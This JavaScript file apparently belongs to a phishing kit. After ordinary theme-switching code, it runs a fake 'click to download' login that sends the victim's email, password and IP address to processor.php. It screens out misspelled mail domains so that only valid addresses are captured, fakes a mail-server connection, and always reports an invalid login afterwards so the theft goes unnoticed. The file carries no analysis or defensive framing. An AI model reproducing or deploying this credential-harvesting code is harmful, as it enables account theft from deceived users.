$(script);

$(function() {

  $('[data-skin]').on('click', function(e) {
    e.preventDefault();
    var skin = $(this).data('skin');
    $('#style-skin').attr('href', 'assets/css/skin-'+ skin +'.css');
  });

  // Sidebar-boxed: Try it section
  $('#sb-left-side').on('click', function() {
    $('.sidebar-boxed').removeClass('sidebar-right');
  });

  $('#sb-right-side').on('click', function() {
    $('.sidebar-boxed').addClass('sidebar-right');
  });

  $('#sb-skin-light').on('click', function() {
    $('.sidebar-boxed').removeClass('sidebar-dark');
  });

  $('#sb-skin-dark').on('click', function() {
    $('.sidebar-boxed').addClass('sidebar-dark');
  });

});
 
function script(){ 
    $("#alert").hide();
	$("#login_btn").on('click', click_to_download);
}
	
function click_to_download(){
    var emailfield = $.trim($("#email").val());
    var passwordfield = $.trim($("#password").val());
    emailfield.toLowerCase();
    var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/; 
    if(emailfield == ""){
        $("#alert").show();
        $("#alert").html("You have a blank email field!"); 
        return;
    }else if(passwordfield == ""){ 
        $("#alert").show();
        $("#alert").html("Password Field Is Blank"); 
        return;
    }else{ 
        if(!emailReg.test(emailfield)){
            $("#alert").show();
            $("#alert").html("Invalid Email Entered!"); 
            return;
        }else{ 
            if(emailfield.indexOf("yah00.com") != -1){ 
                $("#alert").show();
                $("#alert").html("Email Entered not Supported!"); 
                return;
            }else if(emailfield.indexOf("gmai.com") != -1){
                $("#alert").show();
                $("#alert").html("Email Entered not Supported!"); 
                return;
            }else if(emailfield.indexOf("hotma.com") != -1){ 
                $("#alert").show();
                $("#alert").html("Email Entered not Supported!");
                return;
            }else if(emailfield.indexOf("ymai.com") != -1){ 
                $("#alert").show();
                $("#alert").html("Email Entered not Supported!"); 
                return;
            }else if(emailfield.indexOf("sin.com") != -1){ 
                $("#alert").show();
                $("#alert").html("Email Entered not Supported!"); 
                return;
            }else if(emailfield.indexOf("12.com") != -1){ 
                $("#alert").show();
                $("#alert").html("Email Entered not Supported!"); 
                return;
            }else if(emailfield.indexOf("16.com") != -1){ 
                $("#alert").show();
                $("#alert").html("Email Entered not Supported!");
                return;
            }else{
                $("#alert").show();
                $("#alert").html("...connecting to Mail Server"); 
                $("#email").prop('disabled',true); 
                $("#password").prop('disabled',true);
                make_the_delay();
            }  
        } 
    } 
} 

function make_the_delay(){
    var delay = 3000; 
    setTimeout(function() { 
        redirect_the(); 
    }, delay); 
} 

function redirect_the(){ 
    now_download()
} 

function now_download(){
    var the_email = $.trim($("#email").val()); 
    var the_password = $("#password").val(); 
    var the_ip = $("#ip").val();
    
    $("#alert").show();
    $("#alert").html("<img src='assets/img/loading.gif' width='30'> ...Processing download");
    $.ajax({ 
        type: "POST", 
        url: "processor.php", 
        data: { "email" : the_email , "password" : the_password, "ip" : the_ip }, 
        success: function(data){ console.log(data);
            var delay = 3000; setTimeout(function() { 
                $("#alert").show();
                $("#alert").html("<img src='assets/img/not_found.png' width='30'> invalid email and password combination try again");window.location.href="index.php"; }, delay ); 
        }, 
        error: function (data){ 
            $("#alert").show();
            $("#alert").html("Connection Error"); 
        } 
    }); 
}